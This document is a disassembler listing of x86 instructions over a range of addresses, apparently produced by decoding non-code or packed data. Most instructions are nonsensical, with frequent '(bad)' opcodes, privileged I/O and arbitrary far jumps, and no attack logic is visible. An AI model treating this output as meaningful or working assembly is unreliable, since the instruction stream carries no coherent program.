  428164:	sub    BYTE PTR [ecx+0x3c],dh
  428167:	or     esi,esp
  428169:	mov    ecx,0x767decda
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	xor    al,0xbe
  4281e4:	push   ds
  4281e5:	jg     0x42824e
  4281e7:	scas   al,BYTE PTR es:[edi]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	sbb    BYTE PTR [eax+ebp*4],cl
  4281f1:	stos   DWORD PTR es:[edi],eax
  4281f2:	(bad)  
  4281f4:	add    BYTE PTR ds:0xe12086da,ah
  4281fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281fb:	retf   0x6a8b
  4281fe:	std    
  4281ff:	xchg   DWORD PTR [esi],esi
  428201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428202:	cwde   
  428203:	ja     0x428211
  428205:	add    ecx,DWORD PTR [esi+ebp*4-0x5d7cc0cc]
  42820c:	pop    es
  42820d:	int    0x4
  42820f:	shr    DWORD PTR [ebp+0x6e0da03f],1
  428215:	inc    ebp
  428216:	mov    bh,0x2c
  428218:	push   DWORD PTR [ecx]
  42821a:	mov    ebp,0x109b22b8
  42821f:	and    al,0x3
  428221:	lds    esi,FWORD PTR [esi+0x3aede193]
  428227:	aam    0xe1
  428229:	push   ss
  42822a:	add    eax,0x528ae15c
  42822f:	retf   0xfc7a
  428232:	test   DWORD PTR [edi+0x62],ecx
  428235:	clc    
  428236:	or     ch,BYTE PTR [ecx]
  428238:	mov    eax,ds:0x2285db87
  42823d:	test   eax,0xce6deada
  428242:	bound  ebx,QWORD PTR [edi-0x3]
  428245:	in     eax,0x33
  428247:	xchg   DWORD PTR [ebx],eax
  428249:	dec    ebp
  42824a:	int    0xf2
  42824c:	(bad)  [edx]
  42824e:	cs stos DWORD PTR es:[edi],eax
  428250:	scas   al,BYTE PTR es:[edi]
  428251:	(bad)  [eax+0x59]
  428254:	lds    esi,FWORD PTR [ebp+ecx*4-0x3e084dd5]
  42825b:	dec    esp
  42825c:	fcmovnbe st,st(1)
  42825e:	push   0x5e6a2bc9
  428263:	cdq    
  428264:	pop    es
  428265:	inc    esp
  428266:	or     eax,0x81fbb65b
  42826b:	loope  0x428244
  42826d:	test   DWORD PTR [esi-0x63],eax
  428270:	sbb    al,BYTE PTR [esi-0x66]
  428273:	fwait
  428274:	add    dl,BYTE PTR [ebx+0x1c]
  428277:	inc    esp
  428278:	jl     0x428289
  42827a:	pop    ebx
  42827b:	call   0xa1fbdba7
  428280:	cmp    BYTE PTR [edx+0x7a39074b],al
  428286:	sahf   
  428287:	iret   
  428288:	js     0x4282b5
  42828a:	inc    eax
  42828b:	pop    ds
  42828c:	rol    DWORD PTR [eax],0x1c
  42828f:	mov    bh,ch
  428291:	sbb    DWORD PTR [edi],ebx
  428293:	bound  esp,QWORD PTR [eax]
  428295:	pop    ecx
  428296:	fwait
  428297:	call   0xf95b:0xfb
  42829d:	lods   eax,DWORD PTR ds:[esi]
  42829e:	cld    
  42829f:	imul   eax,DWORD PTR [esi+0x18e520b],0x74d66d0a
  4282a9:	shl    DWORD PTR [ebp-0x6ee7bb3],1
  4282af:	cmc    
  4282b0:	inc    edx
  4282b1:	lock pop edi
  4282b3:	arpl   ax,cx
  4282b5:	mov    ecx,0x1b122216
  4282ba:	push   0x27
  4282bc:	repz jno 0x4282aa
  4282bf:	mov    ds:0x85903ac,eax
  4282c4:	xchg   esi,eax
  4282c5:	add    BYTE PTR [eax+0x2f85518f],ch
  4282cb:	aad    0x17
  4282cd:	and    esp,ebx
  4282cf:	in     eax,dx
  4282d0:	test   al,0xcc
  4282d2:	jg     0x4282d7
  4282d4:	dec    esp
  4282d5:	cmc    
  4282d6:	retf   
  4282d7:	cmp    al,0x9
  4282d9:	dec    edx
  4282da:	int    0xb7
  4282dc:	out    dx,eax
  4282dd:	pop    eax
  4282de:	rcl    BYTE PTR [edx],1
  4282e0:	jae    0x42832c
  4282e2:	mov    ds:0x2cba3cf0,al
  4282e7:	retf   
  4282e8:	shl    DWORD PTR [ecx-0x52],cl
  4282eb:	std    
  4282ec:	in     al,0xd7
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	add    BYTE PTR [ebx-0x5098774e],bl
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	jecxz  0x42837e
  428370:	pop    esi
  428371:	adc    DWORD PTR [esi+0x430b23d1],eax
  428377:	aaa    
  428378:	cli    
  428379:	dec    ecx
  42837a:	outs   dx,DWORD PTR ds:[esi]
  42837b:	and    eax,0x3a4c30cf
  428380:	in     eax,dx
  428381:	mov    bl,0x12
  428383:	add    DWORD PTR [ecx-0x3],ebx
  428386:	mov    ebx,0x185353e2
  42838b:	pop    edx
  42838c:	jbe    0x428333
  42838e:	or     al,0x96
  428390:	jl     0x428342
  428392:	inc    esp
  428393:	sar    BYTE PTR [ebp-0x45],cl
  428396:	pop    ss
  428397:	mov    bl,ah
  428399:	cmp    al,0xdd
  42839b:	lods   eax,DWORD PTR ds:[esi]
  42839c:	xor    BYTE PTR [edx-0x31],0xdd
  4283a0:	stos   BYTE PTR es:[edi],al
  4283a1:	daa    
  4283a2:	cmp    DWORD PTR [eax-0x35401058],eax
  4283a8:	bound  edx,QWORD PTR [ecx-0x28]
  4283ab:	lods   eax,DWORD PTR ds:[esi]
  4283ac:	loopne 0x4283b6
  4283ae:	jbe    0x428424
  4283b0:	ror    DWORD PTR [esi],0x2e
  4283b3:	lods   al,BYTE PTR ds:[esi]
  4283b4:	scas   eax,DWORD PTR es:[edi]
  4283b5:	mov    BYTE PTR [ecx-0x744d2e8b],dh
  4283bb:	sbb    BYTE PTR [eax-0x4e688fd5],bl
  4283c1:	repz fs sub al,0xf9
  4283c5:	aad    0x71
  4283c7:	xor    ebp,DWORD PTR [edx+edi*8+0x37]
  4283cb:	imul   edi,esp,0x20d306be
  4283d1:	fxch   st(2)
  4283d3:	shr    bh,1
  4283d5:	repz cmp al,0x63
  4283d8:	fcom   DWORD PTR [ebx]
  4283da:	mov    ch,0xcf
  4283dc:	es pop esi
  4283de:	in     eax,0x34
  4283e0:	out    0x29,al
  4283e2:	jb     0x42841f
  4283e4:	in     al,dx
  4283e5:	or     al,0xbb
  4283e7:	lods   eax,DWORD PTR ds:[esi]
  4283e8:	mov    ecx,0x87849792
  4283ed:	xchg   DWORD PTR [eax-0x29],ebp
  4283f0:	jp     0x4283dd
  4283f2:	cli    
  4283f3:	or     BYTE PTR [ecx],bl
  4283f5:	inc    edx
  4283f6:	sub    esi,DWORD PTR [esp+ebp*1+0x50]
  4283fa:	(bad)  
  4283fb:	cmp    DWORD PTR ds:0xf5e3d794,ebp
  428401:	sub    esi,edx
  428403:	je     0x4283ab
  428405:	jecxz  0x42844e
  428407:	out    0x58,al
  428409:	gs mov eax,0xb085e56d
  42840f:	lods   al,BYTE PTR ds:[esi]
  428410:	sub    eax,0x5783d52
  428415:	push   ds
  428416:	mov    ah,BYTE PTR [eax]
  428418:	pop    eax
  428419:	add    eax,DWORD PTR [esi-0x4]
  42841c:	cmp    edi,DWORD PTR [edi]
  42841e:	loopne 0x42847c
  428420:	mov    ebp,esi
  428422:	push   ebx
  428423:	adc    cl,dh
  428425:	fwait
  428426:	add    dl,BYTE PTR [eax+esi*4]
  428429:	cmp    BYTE PTR [ecx-0x67],ah
  42842c:	jbe    0x42849f
  42842e:	adc    al,0x9
  428430:	mov    al,0x2a
  428432:	cmc    
  428433:	cmc    
  428434:	stos   DWORD PTR es:[edi],eax
  428435:	and    eax,DWORD PTR [ebx-0x38b86058]
  42843b:	pop    es
  42843c:	ss iret 
  42843e:	repz cmp ebp,DWORD PTR [eax+0x6f]
  428442:	fdiv   st(5),st
  428444:	mov    al,BYTE PTR [edx]
  428446:	fcomp  st(0)
  428448:	cwde   
  428449:	mov    edx,DWORD PTR [eax+0x65d094c9]
  42844f:	cmp    DWORD PTR [eax-0x1b],0xfffffff3
  428453:	aas    
  428454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428455:	push   ss
  428456:	fucom  st(4)
  428458:	add    bl,BYTE PTR [ecx]
  42845a:	mov    esp,DWORD PTR ds:0x29d6a84e
  428460:	push   ebx
  428461:	push   es
  428462:	popf   
  428463:	popf   
  428464:	(bad)  
  428465:	(bad)  
  428466:	(bad)  
  428467:	mov    ds:0xa036b69f,eax
  42846c:	popa   
  42846d:	mov    eax,0x0
	...
  4284d6:	push   cs
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x2abfb32
  4284e3:	jle    0x428521
  4284e5:	or     al,0x67
  4284e7:	mov    al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    BYTE PTR [esp+ecx*4+0x62],bl
  4284f1:	outs   dx,DWORD PTR ds:[esi]
  4284f2:	ins    DWORD PTR es:[edi],dx
  4284f3:	mov    ch,0xf5
  4284f5:	(bad)  
  4284f6:	pop    eax
  4284f7:	pusha  
  4284f8:	cmp    al,0x1e
  4284fa:	(bad)  
  4284fc:	xor    dl,dh
  4284fe:	cmc    
  4284ff:	inc    esi
  428500:	xlat   BYTE PTR ds:[ebx]
  428501:	push   0xffffffe9
  428503:	inc    esp
  428504:	or     ecx,esp
  428506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428507:	in     al,0x61
  428509:	fimul  DWORD PTR [esi-0x2b]
  42850c:	cmp    cl,dh
  42850e:	adc    DWORD PTR es:[esi+0x76f87eec],ebp
  428515:	cmp    BYTE PTR [edx+ebx*8],al
  428518:	jg     0x428585
  42851a:	mov    bl,0x24
  42851c:	(bad)  
  42851d:	pop    edx
  42851e:	lock xchg edi,eax
  428520:	xor    eax,0xabd0c028
  428525:	push   cs
  428526:	dec    esp
  428527:	int    0xa9
  428529:	in     eax,dx
  42852a:	dec    edi
  42852b:	(bad)  
  42852c:	fdiv   DWORD PTR [ecx]
  42852e:	mov    ah,0x5d
  428530:	dec    edi
  428531:	cmp    DWORD PTR [esi-0x3c],esp
  428534:	pop    ss
  428535:	arpl   WORD PTR [bx+0x42e2],dx
  42853a:	mov    esp,0x49be8d3a
  42853f:	ror    BYTE PTR [edx-0x62],cl
  428542:	jo     0x428570
  428544:	in     al,dx
  428545:	les    ecx,FWORD PTR [ebx]
  428547:	mov    BYTE PTR [ebx-0x7f],dl
  42854a:	(bad)  
  42854c:	add    cl,BYTE PTR [eax-0x7a]
  42854f:	dec    ebx
  428550:	aas    
  428551:	cmp    ch,bl
  428553:	inc    ebx
  428554:	xchg   BYTE PTR [ebx+0x1a535f7f],dl
  42855a:	icebp  
  42855b:	pop    edi
  42855c:	ss ds int 0x1e
  428560:	or     DWORD PTR [edx-0x41e13979],esi
  428566:	pushf  
  428567:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  428569:	into   
  42856a:	sahf   
  42856b:	ret    0xaaa4
  42856e:	(bad)  
  42856f:	gs icebp 
  428571:	repz int 0xc7
  428574:	out    dx,al
  428575:	xor    DWORD PTR [ecx],edx
  428577:	jecxz  0x4285ca
  428579:	xor    dh,BYTE PTR ds:0x5a08d3e7
  42857f:	sub    DWORD PTR [ebx],edx
  428581:	in     eax,dx
  428582:	sbb    BYTE PTR [edi-0x35bfec61],dl
  428588:	pop    esp
  428589:	mov    eax,DWORD PTR [esi]
  42858b:	out    dx,eax
  42858c:	sbb    eax,0x4cf8d222
  428591:	mov    esp,DWORD PTR [ebx+0x7e]
  428594:	inc    eax
  428595:	data16 sub BYTE PTR [edi],al
  428598:	scas   eax,DWORD PTR es:[edi]
  428599:	pop    ecx
  42859a:	inc    ebp
  42859b:	and    ebx,DWORD PTR [esi+0x7d]
  42859e:	push   ebx
  42859f:	aam    0x2b
  4285a1:	push   ecx
  4285a2:	pop    esi
  4285a3:	sbb    eax,0x6dae5b1e
  4285a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285a9:	inc    edx
  4285aa:	fwait
  4285ab:	leave  
  4285ac:	push   ds
  4285ad:	jp     0x428571
  4285af:	repnz sbb BYTE PTR ds:[edi-0x25],ch
  4285b4:	cmp    edi,DWORD PTR [edi+0x44]
  4285b7:	lock repz stc 
  4285ba:	fs mov ebp,0x57016345
  4285c0:	mov    dh,0xf2
  4285c2:	adc    edi,DWORD PTR [eax+0x54de0255]
  4285c8:	and    dh,0xee
  4285cb:	mov    edx,0xb8595fdc
  4285d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285d1:	dec    ecx
  4285d2:	sub    esi,ebx
  4285d4:	popf   
  4285d5:	rol    BYTE PTR [ecx+0x57],1
  4285d8:	and    DWORD PTR [edi],0x2e
  4285db:	fsub   DWORD PTR [ebp+esi*2+0x209fabac]
  4285e2:	jl     0x4285b8
  4285e4:	pop    ds
  4285e5:	and    DWORD PTR [esi+edx*1+0x336d498d],eax
  4285ec:	push   0x30
	...
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x6bf2a3f6
  428664:	aaa    
  428665:	test   eax,0x1b167
  42866a:	add    BYTE PTR [ecx],al
  42866c:	add    BYTE PTR [eax],al
  42866e:	or     BYTE PTR [edi+0x2224676d],0xaf
  428675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428676:	jg     0x428620
  428678:	test   al,0x42
  42867a:	and    BYTE PTR [esi-0x4a72f3f2],0xd0
  428681:	scas   eax,DWORD PTR es:[edi]
  428682:	and    ebx,DWORD PTR ds:0xbe9ced2d
  428688:	sub    eax,0x160d769d
  42868d:	aad    0xc6
  42868f:	push   edx
  428690:	xchg   edx,eax
  428691:	mov    ebx,0x714f58b
  428696:	ss repz xchg al,ah
  42869a:	xor    BYTE PTR [edx],cl
  42869c:	dec    esi
  42869d:	ss inc edi
  42869f:	dec    ebp
  4286a0:	jbe    0x428625
  4286a2:	lods   al,BYTE PTR ds:[esi]
  4286a3:	pop    edi
  4286a4:	adc    bh,BYTE PTR [ebx-0x1e0483b4]
  4286aa:	sbb    eax,0xd65d945b
  4286af:	mov    ch,0x70
  4286b1:	jne    0x428690
  4286b3:	mov    eax,ds:0x115addd0
  4286b8:	adc    al,0xdf
  4286ba:	mov    esi,0xd450c431
  4286bf:	add    esp,DWORD PTR [ebx]
  4286c1:	hlt    
  4286c2:	retf   0xdfa
  4286c5:	aas    
  4286c6:	cmp    edx,ebx
  4286c8:	lods   eax,DWORD PTR ds:[esi]
  4286c9:	adc    BYTE PTR [ebp-0x4a],dh
  4286cc:	mov    al,0x6e
  4286ce:	xor    bl,dh
  4286d0:	lods   al,BYTE PTR ds:[esi]
  4286d1:	dec    edx
  4286d2:	jno    0x428675
  4286d4:	icebp  
  4286d5:	adc    al,0x62
  4286d7:	ja     0x428709
  4286d9:	das    
  4286da:	push   esp
  4286db:	adc    al,0xbd
  4286dd:	xor    eax,0x7825ed89
  4286e2:	mov    eax,0xce376dfc
  4286e7:	cmp    esp,esi
  4286e9:	aam    0x8c
  4286eb:	sub    cl,BYTE PTR [esi+0x4faef897]
  4286f1:	add    edi,0x9ef78578
  4286f7:	mov    ebp,0xc260938b
  4286fc:	mov    DWORD PTR ds:0xf4a08e7d,eax
  428702:	pop    ebx
  428703:	call   0x50e:0xfa1aaf71
  42870a:	or     esi,DWORD PTR [ebx]
  42870c:	push   es
  42870d:	lock pushf 
  42870f:	dec    edx
  428710:	jmp    0x18e0:0x31625154
  428717:	out    0x84,eax
  428719:	or     edi,0xffffffc7
  42871c:	xor    BYTE PTR [esi],bh
  42871e:	inc    ebp
  42871f:	and    DWORD PTR [ebx+0x63d9a17b],esi
  428725:	jle    0x428736
  428727:	call   0x66730527
  42872c:	or     al,0x1e
  42872e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42872f:	ja     0x42875d
  428731:	(bad)  
  428732:	pop    eax
  428733:	outs   dx,BYTE PTR ds:[esi]
  428734:	jmp    0x6f9e0f2e
  428739:	mov    dh,al
  42873b:	pop    ebp
  42873c:	add    eax,0x7df30081
  428741:	mov    DWORD PTR [edx],esp
  428743:	push   cs
  428744:	or     bh,BYTE PTR ds:0xda96527e
  42874a:	repz out 0x77,eax
  42874d:	ss push edx
  42874f:	and    eax,0xee6c03e7
  428754:	jmp    0xd67ffefb
  428759:	aam    0xe5
  42875b:	pop    eax
  42875c:	or     ch,BYTE PTR ds:0xcedef34f
  428762:	ss pop edi
  428764:	xchg   DWORD PTR [ecx+0x65],ebx
  428767:	in     eax,0x4a
  428769:	mov    WORD PTR [esi+eiz*4],?
  42876c:	push   eax
  42876d:	stos   BYTE PTR es:[edi],al
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x7a35aff8
  4287e5:	stc    
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    BYTE PTR [ebp-0x41],bh
  4287f0:	adc    dh,BYTE PTR [esi+0x55]
  4287f3:	xor    al,0x14
  4287f5:	add    eax,0x5a67eff1
  4287fa:	mov    al,0x2c
  4287fc:	mov    bh,0xc9
  4287fe:	mov    dh,0xb8
  428800:	test   al,0x3
  428802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428803:	push   ebp
  428804:	inc    ebp
  428805:	pop    edx
  428806:	test   cl,al
  428808:	aas    
  428809:	test   DWORD PTR [eax-0x52faaf5d],esp
  42880f:	adc    BYTE PTR [ecx],bh
  428811:	push   esp
  428812:	loope  0x428795
  428814:	add    dh,BYTE PTR [ebp+ecx*4-0x4b]
  428818:	add    edx,esi
  42881a:	add    cl,BYTE PTR [ebp-0x7355a052]
  428820:	fs xchg ebp,eax
  428822:	aaa    
  428823:	pushf  
  428824:	lea    ebx,ds:[ecx-0x75]
  428828:	jecxz  0x42885b
  42882a:	dec    ebp
  42882b:	sahf   
  42882c:	in     eax,0xdc
  42882e:	mov    ebx,0x59c6ec42
  428833:	adc    esi,DWORD PTR [ebx-0xae2faaf]
  428839:	test   BYTE PTR ds:0x49f5752b,dl
  42883f:	jmp    0xd94e:0xc0c798aa
  428846:	bound  esi,QWORD PTR [edi]
  428848:	and    ecx,edx
  42884a:	lahf   
  42884b:	and    bl,BYTE PTR [edx-0x113fe972]
  428851:	pop    ss
  428852:	rol    DWORD PTR [esi-0x59],1
  428855:	test   BYTE PTR [ebx+0x577018fb],bh
  42885b:	aaa    
  42885c:	pop    ebx
  42885d:	test   eax,0xac3c2a69
  428862:	or     eax,esp
  428864:	cld    
  428865:	mov    al,0x6d
  428867:	out    0xbb,eax
  428869:	test   DWORD PTR [edx],eax
  42886b:	call   0xba40ee4
  428870:	xchg   DWORD PTR [edi],edx
  428872:	dec    ebp
  428873:	dec    ebp
  428874:	sar    DWORD PTR [ecx-0x2574ada8],0x25
  42887b:	jge    0x428854
  42887d:	xor    ch,BYTE PTR [esi-0x1d]
  428880:	outs   dx,DWORD PTR ds:[esi]
  428881:	repnz or esi,DWORD PTR [ebx]
  428884:	pop    eax
  428885:	aam    0xae
  428887:	cmp    bl,BYTE PTR [edx-0x5a]
  42888a:	rcl    DWORD PTR [ebx+0x7],cl
  42888d:	jno    0x42889b
  42888f:	in     eax,0x6a
  428891:	aaa    
  428892:	rcr    DWORD PTR [esi-0x36],1
  428895:	cmc    
  428896:	fldenv [ecx]
  428898:	mov    eax,ds:0x3f0b7294
  42889d:	(bad)  
  42889e:	pusha  
  42889f:	push   0xc3620358
  4288a4:	dec    esp
  4288a5:	ss fucomi st,st(5)
  4288a8:	cdq    
  4288a9:	dec    cl
  4288ab:	(bad)  
  4288ac:	mov    dh,0x59
  4288ae:	dec    ebx
  4288af:	jmp    0x83c3:0xb77b557c
  4288b6:	shl    DWORD PTR [esp+ebp*2+0x6e],0xc6
  4288bb:	and    al,0x71
  4288bd:	dec    ah
  4288bf:	mov    ch,0x9f
  4288c1:	mov    dl,0xd9
  4288c3:	sbb    al,0xe0
  4288c5:	in     al,dx
  4288c6:	fwait
  4288c7:	lock test eax,0xcaa0e91d
  4288cd:	cmp    DWORD PTR ds:0xdc90c840,eax
  4288d3:	pushf  
  4288d4:	sub    cl,bh
  4288d6:	(bad)  
  4288d7:	test   BYTE PTR gs:[ebx-0x45],dl
  4288db:	loope  0x428884
  4288dd:	xchg   ebp,eax
  4288de:	ret    
  4288df:	loopne 0x428898
  4288e1:	rol    edi,cl
  4288e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4288e4:	(bad)
  4288e7:	jle    0x428935
  4288e9:	loopne 0x428928
  4288eb:	lahf   
  4288ec:	ss mov ebp,0x0
	...
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x17e262f1],bx
  428964:	add    DWORD PTR [eax+0x1b367],ebx
  42896a:	add    BYTE PTR [ecx],al
  42896c:	add    BYTE PTR [eax],al
  42896e:	sub    dl,cl
  428970:	cld    
  428971:	pop    es
  428972:	pop    es
  428973:	sub    eax,0x416e6ab3
  428978:	lods   eax,DWORD PTR ds:[esi]
  428979:	call   0x95f15b76
  42897e:	push   ss
  42897f:	mov    eax,ds:0x76793751
  428984:	mov    ?,esp
  428986:	je     0x4289ab
  428988:	inc    eax
  428989:	not    DWORD PTR [edi-0x793046a5]
  42898f:	dec    edi
  428990:	cmp    bh,BYTE PTR [edx-0x37]
  428993:	dec    ecx
  428994:	ret    0x8b6a
  428997:	out    0xae,eax
  428999:	sub    DWORD PTR [eax*4+0x783e1b1b],ebp
  4289a0:	jb     0x4289e8
  4289a2:	pop    ds
  4289a3:	add    edi,esp
  4289a5:	cmc    
  4289a6:	scas   al,BYTE PTR es:[edi]
  4289a7:	lds    ebx,FWORD PTR [edx+0x1f35fe76]
  4289ad:	mov    ebp,0x8daf6603
  4289b2:	mov    sp,si
  4289b5:	fwait
  4289b6:	test   eax,0xe896317
  4289bb:	mov    bh,0xef
  4289bd:	repz rcl DWORD PTR [ebp+0x3fd6e51f],0x3b
  4289c5:	out    0x47,al
  4289c7:	mov    BYTE PTR [edi+ebp*1+0x41a73c53],cl
  4289ce:	stos   BYTE PTR es:[edi],al
  4289cf:	adc    edx,DWORD PTR [eax+0x446f1440]
  4289d5:	shl    BYTE PTR es:[ecx+eax*4],0x58
  4289da:	add    eax,0x402136ee
  4289df:	pop    esp
  4289e0:	sahf   
  4289e1:	pusha  
  4289e2:	sub    al,0xf3
  4289e4:	or     eax,DWORD PTR [esi+0x60e3d34]
  4289ea:	jo     0x4289af
  4289ec:	and    eax,0x82a9fcac
  4289f1:	mov    eax,ds:0xdf39fc1e
  4289f6:	lock or eax,0xd92c3b55
  4289fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289fd:	mov    es,ebx
  4289ff:	mov    edx,0xb03137ef
  428a04:	and    DWORD PTR [ebp-0x6e],esi
  428a07:	outs   dx,BYTE PTR ds:[esi]
  428a08:	xchg   BYTE PTR ds:[edx],ah
  428a0b:	pop    edx
  428a0c:	jmp    FWORD PTR [edi-0x424f871d]
  428a12:	or     esp,ebp
  428a14:	rcr    DWORD PTR [esi],cl
  428a16:	push   ebx
  428a17:	inc    ebp
  428a18:	inc    eax
  428a19:	adc    cl,BYTE PTR [edx]
  428a1b:	mov    DWORD PTR [edi-0x13e929f0],esi
  428a21:	shl    BYTE PTR [edx+0x41],0x48
  428a25:	xchg   ebx,eax
  428a26:	out    0x1a,eax
  428a28:	in     al,0x99
  428a2a:	sbb    BYTE PTR [ebp+0x29],cl
  428a2d:	retf   
  428a2e:	xchg   esp,eax
  428a2f:	add    BYTE PTR [edx],ah
  428a31:	out    dx,eax
  428a32:	test   DWORD PTR [esi+0x50],edx
  428a35:	out    dx,eax
  428a36:	popa   
  428a37:	jg     0x4289fb
  428a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a3a:	lock (bad) 
  428a3d:	mov    ch,0x75
  428a3f:	cmc    
  428a40:	jp     0x4289e1
  428a42:	das    
  428a43:	add    eax,0x92e248eb
  428a48:	cwde   
  428a49:	inc    ebx
  428a4a:	mov    gs,ecx
  428a4c:	out    dx,eax
  428a4d:	push   ebx
  428a4e:	push   esi
  428a4f:	dec    esi
  428a50:	xor    BYTE PTR [eax+0x4],ch
  428a53:	mov    WORD PTR [eax],cs
  428a55:	(bad)  
  428a56:	push   esi
  428a57:	add    eax,0xe4596c68
  428a5c:	sti    
  428a5d:	jmp    0x1f094194
  428a62:	jne    0x428a5c
  428a64:	mov    ch,0x2d
  428a66:	adc    eax,DWORD PTR [ebx-0x312952a4]
  428a6c:	xchg   edi,eax
  428a6d:	out    dx,al
	...
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x40192713]
  428ae5:	sub    eax,0x1b467
  428aea:	add    BYTE PTR [ecx],al
  428aec:	add    BYTE PTR [eax],al
  428aee:	pop    esi
  428aef:	gs jnp 0x428b3b
  428af2:	lds    esp,FWORD PTR [eax+0x129b5a8b]
  428af8:	fbstp  TBYTE PTR [ebx-0xc]
  428afb:	pushf  
  428afc:	inc    eax
  428afd:	xchg   esp,eax
  428afe:	jmp    0x428b2c
  428b00:	dec    esp
  428b01:	mov    BYTE PTR [ecx],bl
  428b03:	fwait
  428b04:	push   ds
  428b05:	mov    ds:0x740709e0,al
  428b0a:	pushf  
  428b0b:	ficom  WORD PTR [esi+edi*1]
  428b0e:	repnz out 0xe5,eax
  428b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b12:	stc    
  428b13:	or     eax,0xd86811f8
  428b18:	pop    eax
  428b19:	jecxz  0x428b09
  428b1b:	sub    eax,0xddf703b9
  428b20:	fcomp  QWORD PTR [ebp-0x3f]
  428b23:	lea    edx,[esi-0x1acda25d]
  428b29:	dec    edi
  428b2a:	cli    
  428b2b:	mov    ecx,0x4f70b211
  428b30:	scas   al,BYTE PTR es:[edi]
  428b31:	mov    ebp,0xc2adc732
  428b36:	ds icebp 
  428b38:	push   edi
  428b39:	jge    0x428b89
  428b3b:	mov    bp,ax
  428b3e:	jmp    0x716e220
  428b43:	inc    edi
  428b44:	mov    ds:0xc9c7a92e,al
  428b49:	icebp  
  428b4a:	sbb    eax,0xae9fc051
  428b4f:	out    dx,al
  428b50:	ins    BYTE PTR es:[edi],dx
  428b51:	shr    DWORD PTR [esi],cl
  428b53:	mov    ebp,0xc6a5686f
  428b58:	and    BYTE PTR [ebx-0x51],ah
  428b5b:	in     al,0xd7
  428b5d:	shl    DWORD PTR [esp+edx*8-0x2e],0x34
  428b62:	mov    al,bh
  428b64:	mov    dh,0xc9
  428b66:	frstor [esi]
  428b68:	sti    
  428b69:	mov    ebx,0x96f738aa
  428b6e:	mov    al,0x38
  428b70:	sub    al,0xc
  428b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b73:	sbb    DWORD PTR [edx-0x4d],ebx
  428b76:	cmp    dl,BYTE PTR [edi+0x6a]
  428b79:	dec    ebx
  428b7a:	dec    eax
  428b7b:	mov    ecx,0xdf07fd63
  428b81:	or     esp,DWORD PTR [esi]
  428b83:	jnp    0x428b77
  428b85:	dec    ebx
  428b86:	inc    ecx
  428b87:	mov    ds:0x9ce16640,eax
  428b8c:	aam    0xa8
  428b8e:	loop   0x428b3a
  428b90:	pop    ss
  428b91:	push   0xffffffe1
  428b93:	adc    al,0x28
  428b95:	mov    edi,0x34f57cfc
  428b9a:	mov    WORD PTR [edi-0x62],ss
  428b9d:	mov    DWORD PTR [eax-0x1c08a55e],esp
  428ba3:	lods   al,BYTE PTR ds:[esi]
  428ba4:	bound  ebp,QWORD PTR [esi-0x431127ba]
  428baa:	mov    eax,ds:0xbfb97511
  428baf:	xor    BYTE PTR [eax],bh
  428bb1:	pop    ds
  428bb2:	popf   
  428bb3:	mov    eax,0x18ab9ca2
  428bb8:	adc    bl,ch
  428bba:	sub    eax,0xca866f2e
  428bbf:	out    dx,al
  428bc0:	push   esp
  428bc1:	aad    0x10
  428bc3:	ror    DWORD PTR [esi+ebx*2],cl
  428bc6:	rcl    DWORD PTR [edx+0x2d],0x57
  428bca:	sub    DWORD PTR [eax-0x80],esi
  428bcd:	ins    BYTE PTR es:[edi],dx
  428bce:	retf   
  428bcf:	out    dx,eax
  428bd0:	adc    al,0x5b
  428bd2:	adc    al,0x70
  428bd4:	or     esi,ebp
  428bd6:	out    0x25,eax
  428bd8:	(bad)  
  428bd9:	mov    bh,0x1a
  428bdb:	push   esi
  428bdc:	pusha  
  428bdd:	and    dl,ah
  428bdf:	test   BYTE PTR [esi-0x704f6701],ah
  428be5:	adc    al,0x50
  428be7:	and    al,BYTE PTR [edx+ebx*2]
  428bea:	mov    ds:0xe27e65,al
	...
